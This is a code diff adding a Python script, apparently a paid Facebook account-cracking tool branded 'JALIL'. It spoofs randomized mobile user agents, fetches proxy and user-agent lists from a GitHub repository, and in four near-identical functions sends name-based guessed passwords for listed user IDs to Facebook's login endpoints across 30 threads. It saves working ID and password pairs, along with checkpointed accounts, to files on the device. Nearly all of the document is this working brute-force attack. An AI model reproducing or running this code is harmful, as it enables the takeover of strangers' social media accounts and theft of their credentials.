+        l='Mobile/20A5312g [FBAN/FBIOS;FBDV/iPhone13,1;FBMD/iPhone;FBSN/iOS;FBSV/16.0;FBSS/3;FBID/phone;FBLC/cs_CZ;FBOP/5]'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)      
+
+for agent in range(10000):
+        aa='Mozilla/5.0 (Linux; Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv)'
+        b=random.choice(['6','7','8','9','10','11','12'])
+        c='Android 11; Nokia C20 Plus Build/RP1A.201005.001; wv'
+        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        e=random.randrange(1, 999)
+        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129'
+        h=random.randrange(73,100)
+        i='0'
+        j=random.randrange(4200,4900)
+        k=random.randrange(40,150)
+        l='Mobile Safari/537.36[FBAN/EMA;FBLC/ta_IN;FBAV/331.0.0.9.105;]'
+        fullagnt=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+        ugen.append(fullagnt)      
+try:
+    prox= requests.get('https://raw.githubusercontent.com/jalilha/jalil/main/proxies.txt').text
+    open('proxies.txt','w').write(proxies)
+except Exception as e:
+    print('\x1b[1;92m[√] WELCOME...')
+	
+proxies=open('proxies.txt','r').read().splitlines()
+
+
+android_models=[]
+try:
+    xx = requests.get('https://raw.githubusercontent.com/jalilha/jalil/main/xstringsx.txt').text.splitlines()
+    for line in xx:
+        android_models.append(line)
+except:pass
+
+usr=[]
+def uaku():
+	try:
+		ua=open('ua.txt','r').read().splitlines()
+		for ub in ua:
+			ugen.append(ub)
+	except:
+		a=requests.get('https://raw.githubusercontent.com/jalilha/jalil/main/xuax.txt').text
+		ua=open('xuax.txt','w')
+		aa=re.findall('line">(.*?)<',str(a))
+		for un in aa:
+			ua.write(un+'\n') 
+		ua=open('xuax.txt','r').read().splitlines()
+       
+logo=(f"""\x1b[38;5;208m
+   oooo       .o.       ooooo        ooooo ooooo        
+   `888      .888.      `888'        `888' `888'        
+    888     .8"888.      888          888   888         
+    888    .8' `888.     888          888   888         
+    888   .88ooo8888.    888          888   888         
+    888  .8'     `888.   888       o  888   888       o 
+.o. 88P o88o     o8888o o888ooooood8 o888o o888ooooood8 
+`Y888P  
+                                                                                                                    
+\033[1;33m=========================================================
+ \033[1;91mFACEBOOK  : \033[1;36mH. M. JALIL\033[1;37m
+ \033[1;91mTELEGRAM  : \033[1;36mITZJALIL0\033[1;37m
+ \033[1;91mWHATSAPP  : \033[1;36m213676980481\033[1;37m
+ \033[1;91mVERSIONl  : \033[1;36m1.0\033[1;37m
+ \033[1;91mTOOL      : \033[1;36mPAID\033[1;37m
+\033[1;33m========================================================\033[1;33m
+""")
+def linex():
+        print('\033[1;33m========================================================\033[1;33m')
+def clear():
+        os.system(f'clear')
+        print(logo)
+loop=0
+oks=[]
+cps=[]
+pcp=[]
+id=[]
+tokenku=[]
+os.system('git pull')
+def Fof():
+	clear()
+	print(f" [\033[1;32m1\033[1;37m] FILE CLONEING ")
+	print(f" [\033[1;31m0\033[1;37m] Exit")
+	me=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
+	if me in ["2", "02"]:
+	    os.system('python jaliil.py')
+     
+	#if me in ["3","03"]:
+		#gml()
+	if me in ["1", "01","11","A","a"]:
+		clear()
+		file = input(f' [\033[1;32m✓\033[1;37m] Put File Location [\033[1;32m❯\033[1;37m] ')
+		try:
+			fo = open(file,'r').read().splitlines()
+		except FileNotFoundError:
+			print(f' [\033[1;32mX\033[1;37m] File location Not Found ')
+			exit()
+		print(f' [\033[1;31m1\033[1;37m] Method \033[1;32m1\033[1;37m [\033[1;32mMix Ids\033[1;37m] \n [\033[1;31m2\033[1;37m] Method \033[1;32m2\033[1;37m [\033[1;32mMexico Ids\033[1;37m] \n [\033[1;31m3\033[1;37m] Method \033[1;32m3\033[1;37m [\033[1;32mIndia Ids\033[1;37m] \n [\033[1;31m4\033[1;37m] Method \033[1;32m4\033[1;37m [\033[1;32mBd Ids\033[1;37m]  ')
+		mthd=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
+		plist=[]
+		try:
+			ps_limit = int(input(f' [\033[1;32m?\033[1;37m] How Many Passwords Do You Want To Add [\033[1;32m⟩\033[1;37m] '))
+		except:
+			ps_limit =1
+		print(f' [\033[1;32m•\033[1;37m] Example: \033[1;36mfirst last,firtslast,first123 \033[1;37m')
+		for i in range(ps_limit):
+			plist.append(input(f' [\033[1;32m✓\033[1;37m] Put password {i+1}[\033[1;32m❯\033[1;37m] '))
+		print(f' [\033[1;32m?\033[1;37m] Do You Went Show CP IDs (y/n): ')
+		cx=input(f' [\033[1;32m✓\033[1;37m] Choice : ')
+		if cx in ['n','N','no','NO','2']:
+			pcp.append(f'n')
+		else:
+			pcp.append(f'y')
+		with tred(max_workers=30) as crack_submit:
+			clear()
+			total_ids = str(len(fo))
+			print(f' Total Account : \033[1;32m'+total_ids+f' \n \033[1;37mMethod : \033[1;32mM{mthd}\033[1;37m')
+			print(f"\033[1;36m Use Flight Mode For Speed Up\033[1;37m")
+			linex()
+			for user in fo:
+				ids,names = user.split('|')
+				passlist = plist
+				if mthd in ['1','01']:
+					crack_submit.submit(m1,ids,names,passlist)
+				elif mthd in ['2','02']:
+					crack_submit.submit(m2,ids,names,passlist)
+				elif mthd in ['3','03']:
+					crack_submit.submit(m3,ids,names,passlist)
+				elif mthd in ['4','04']:
+					crack_submit.submit(m4,ids,names,passlist)
+				#elif mthd in ['5','05']:
+					#crack_submit.submit(m5,ids,names,passlist)
+				#elif mthd in ['6','06']:
+					#crack_submit.submit(ffb4,ids,names,passlist)
+				#elif mthd in ['7','07']:
+					#crack_submit.submit(ffb7,ids,names,passlist)
+				#elif mthd in ['8','08']:
+					#crack_submit.submit(ffb8,ids,names,passlist)
+				#else:
+					#crack_submit.submit(m5,ids,names,passlist)
+				
+def m1(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r\033[1;37m [JALIIIL] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session()
+        try:
+                first = names.split(f' ')[0]
+                try:
+                        last = names.split(f' ')[1]
+                except:
+                        last = 'Ahmed'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
+                        ua=random.choice(ugen)
+                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://p.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        jaliil=session.cookies.get_dict().keys()
+                        if "c_user" in jaliil:
+                                coki=session.cookies.get_dict()
+                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                open(f'/sdcard/JALIIIL•OK•M1.txt', 'a').write(ids+'|'+pas+'\n')
+                                oks.append(ids)
+                                break
+                        elif 'checkpoint' in jaliil:
+                                if 'y' in pcp:
+                                        print(f'\r\r\x1b[38;5;208m [JALIIIL•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/JALIIIL•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
+        loop+=1
+                        
+def m3(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r\033[1;37m [JALIIIL] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session()
+        try:
+                first = names.split(f' ')[0]
+                try:
+                        last = names.split(f' ')[1]
+                except:
+                        last = 'Ahmed'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
+                        ua=random.choice(ugen)
+                        head = {'Host': 'm.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        jaliil=session.cookies.get_dict().keys()
+                        if "c_user" in jaliil:
+                                coki=session.cookies.get_dict()
+                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                open(f'/sdcard/JALIIIL•OK•M3.txt', 'a').write(ids+'|'+pas+'\n')
+                                oks.append(ids)
+                                break
+                        elif 'checkpoint' in jaliil:
+                                if 'y' in pcp:
+                                        print(f'\r\r\x1b[38;5;208m [JALIIIL•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/JALIIIL•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
+        loop+=1
+
+def m2(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r\033[1;37m [JALIIIL] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session()
+        try:
+                first = names.split(f' ')[0]
+                try:
+                        last = names.split(f' ')[1]
+                except:
+                        last = 'Ahmed'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
+                        ua=random.choice(ugen)
+                        head = {'Host': 'mbasic.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Windows"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        jaliil=session.cookies.get_dict().keys()
+                        if "c_user" in jaliil:
+                                coki=session.cookies.get_dict()
+                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                open(f'/sdcard/JALIIIL•OK•M2.txt', 'a').write(ids+'|'+pas+'\n')
+                                oks.append(ids)
+                                break
+                        elif 'checkpoint' in jaliil:
+                                if 'y' in pcp:
+                                        print(f'\r\r\x1b[38;5;208m [JALIIIL•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/JALIIIL•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
+        loop+=1
+
+def m4(ids,names,passlist):
+        global loop,oks,cps
+        sys.stdout.write(f'\r\r\033[1;37m [JALIIIL] \033[1;36m•\033[1;37m %s \033[1;36m•\033[1;37m OK \033[1;36m•\033[1;37m [\033[1;32m%s\033[1;37m]'%(loop,len(oks)));sys.stdout.flush()
+        session = requests.Session()
+        try:
+                first = names.split(f' ')[0]
+                try:
+                        last = names.split(f' ')[1]
+                except:
+                        last = 'Ahmed'
+                ps = first.lower()
+                ps2 = last.lower()
+                for fikr in passlist:
+               	        pas = fikr.replace(f'First',first).replace(f'Last',last).replace(f'first',ps).replace(f'last',ps2)
+                        ua=random.choice(ugen)
+                        head = {'Host': 'x.facebook.com', 'viewport-width': '980',  'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101", "Google Chrome";v="101"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'same-origin', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
+                        getlog = session.get(f'https://mbasic.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        idpass ={"lsd":re.search(f'name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search(f'name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://mbasic.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
+                        complete = session.post(f'https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        jaliil=session.cookies.get_dict().keys()
+                        if "c_user" in jaliil:
+                                coki=session.cookies.get_dict()
+                                kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
+                                print(f'\r\r\033[1;32m [JALIIIL\033[1;36m•\033[1;37m\033[1;32mOK] %s \033[1;36m•\033[1;37m\033[1;32m %s'%(ids,pas))
+                                #cek_apk(session,coki)
+                                #print(f'\033[1;36m [Cookie]\033[1;37m : '+coki)
+                                open(f'/sdcard/JALIIIL•OK•M4.txt', 'a').write(ids+'|'+pas+'\n')
+                                oks.append(ids)
+                                break
+                        elif 'checkpoint' in jaliil:
+                                if 'y' in pcp:
+                                        print(f'\r\r\x1b[38;5;208m [JALIIIL•CP] '+ids+' • '+pas+'\033[1;97m')
+                                        open(f'/sdcard/JALIIIL•CP.txt', 'a').write(ids+'|'+pas+'\n')
+                                        cps.append(ids)
+                                        break
+                                else:
+                                        break
+                        else:
+                                continue
+        except requests.exceptions.ConnectionError:
+                time.sleep(20)
+        loop+=1
+
+
+Fof()
